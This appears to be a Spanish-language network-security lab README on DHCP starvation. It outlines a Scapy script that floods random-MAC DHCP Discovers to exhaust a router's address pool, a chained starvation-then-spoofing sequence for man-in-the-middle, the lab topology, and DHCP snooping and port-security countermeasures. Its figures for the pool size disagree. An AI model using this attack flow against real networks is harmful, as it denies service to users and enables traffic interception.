# 🍽️ DHCP Starvation — Agotamiento del Pool DHCP

## 🎯 Objetivo del Laboratorio

Demostrar cómo un atacante puede agotar el pool de direcciones IP del servidor DHCP legítimo enviando masivamente solicitudes con MACs aleatorias, dejando sin posibilidad de obtener IP a los clientes reales de la red. Se utiliza como paso previo al DHCP Spoofing para un ataque combinado.

Link a la lista de reproducción: https://www.youtube.com/playlist?list=PL1bMSHFyMPr7W7DrFd-INmRRQDjGquFIV
---

## 📋 Objetivo del Script

El script `DHCP_Starvation.py` genera continuamente DHCP Discover frames con MACs de hardware completamente aleatorias (unicast), enviándolos taggeados en VLAN 10 a través de la interfaz física `ens4`. Cada Discover distinto provoca que el servidor DHCP reserve una IP diferente hasta agotar el pool.

### Parámetros usados

| Parámetro | Valor | Descripción |
|-----------|-------|-------------|
| `IFACE` | `ens4` | Interfaz física conectada al switch (trunk) |
| `VLAN` | `10` | VLAN objetivo donde está el pool DHCP |
| Loop infinito | — | Se detiene con Ctrl+C |

### Requisitos para utilizar la herramienta

```bash
# Dependencias
pip install scapy

# No requiere IP forwarding
# Requiere root para enviar frames raw

sudo python3 DHCP_Starvation.py
```

---

## 🔧 Documentación del Funcionamiento del Script

### Flujo de ejecución

```
1. Bucle infinito:
     a. Generar MAC aleatoria con RandMAC()
     b. Generar chaddr aleatorio con RandBin(6)
     c. Construir paquete:
          Ether(src=MAC_aleatoria, dst=broadcast) /
          Dot1Q(vlan=10) /                          ← trunk hacia SW-1
          IP(src=0.0.0.0, dst=255.255.255.255) /
          UDP(sport=68, dport=67) /
          BOOTP(chaddr=RandBin(6)) /
          DHCP(options=[("message-type","discover")])
     d. sendp() por ens4
     e. Cada 50 paquetes → imprimir contador
2. Ctrl+C → mostrar total enviado y salir
```

### Por qué usa `Dot1Q` en la interfaz física

El puerto E0/3 de SW-1 está configurado como **access VLAN 10**, pero el script envía desde `ens4` (la interfaz física de Kali). Al incluir el tag `Dot1Q(vlan=10)`, el frame llega taggeado al switch — en un puerto access, el switch trata el tráfico taggeado según su configuración; en este lab el acceso VLAN 10 permite que el Discover llegue al servidor DHCP en R1.

### Diferencia con DHCP Spoofing

| Característica | DHCP Starvation | DHCP Spoofing |
|----------------|-----------------|---------------|
| Rol del atacante | Cliente masivo | Servidor falso |
| Objetivo | Agotar el pool | Redirigir clientes |
| Protocolo | Solo DISCOVER | OFFER + ACK |
| Efecto | DoS de red | MitM automático |
| Uso combinado | Paso 1 | Paso 2 |

### Ataque combinado (orden recomendado)

```
1. Ejecutar DHCP_Starvation.py → pool de R1 agotado
2. Ejecutar DHCP_Spoofing.py   → único servidor disponible
3. Nuevas VPCs reciben IP de Kali con gateway falso → MitM
```

---

## 🗺️ Documentación de la Red

### Topología

```
        [ R1 — IOU L3 ]
        DHCP Pool VLAN 10:
          excluded: .1-.99 y .100-.254 (solo .100-.199 disponibles)
          ← Se agota con ~100 Discovers únicos
               |
           e0/0 (trunk)
               |
        [ SW-1 — IOL L2 ]
         e0/1       e0/3
          |           |
       [SW-3]     [Kali]
       VLAN 10     ens4  (física)
       VPC-1,4     192.168.10.50
```

### Pool DHCP de R1 (del `show run`)

```
ip dhcp excluded-address 192.168.10.1 192.168.10.99
ip dhcp pool LAN
 network 192.168.10.0 255.255.255.0
 default-router 192.168.10.254
 dns-server 8.8.8.8 1.1.1.1
 lease 0 8
```

> El pool disponible real es `.100` a `.254` → **155 IPs**. El script las agota con ~155 Discovers con MACs únicas.

---

## 🛡️ Contra-medidas

### DHCP Snooping con rate-limiting

```
! Habilitar DHCP Snooping
SW-1(config)# ip dhcp snooping
SW-1(config)# ip dhcp snooping vlan 10,20

! Puerto confiable (hacia R1)
SW-1(config)# interface Ethernet0/0
SW-1(config-if)# ip dhcp snooping trust

! Limitar Discovers por segundo en puertos de acceso
SW-1(config)# interface Ethernet0/3
SW-1(config-if)# ip dhcp snooping limit rate 10
! (máximo 10 DHCP pkt/s — el ataque envía cientos)

! Port Security — limitar MACs por puerto
SW-1(config)# interface Ethernet0/3
SW-1(config-if)# switchport port-security maximum 3
SW-1(config-if)# switchport port-security violation restrict
SW-1(config-if)# switchport port-security

! Verificación
SW-1# show ip dhcp snooping statistics
SW-1# show port-security interface Ethernet0/3
```

> **Efecto de la mitigación:** El rate-limit descarta los Discovers que superen 10/s. Port Security bloquea el puerto si aparecen más de 3 MACs distintas. Ambas medidas combinadas hacen el ataque de Starvation inviable.
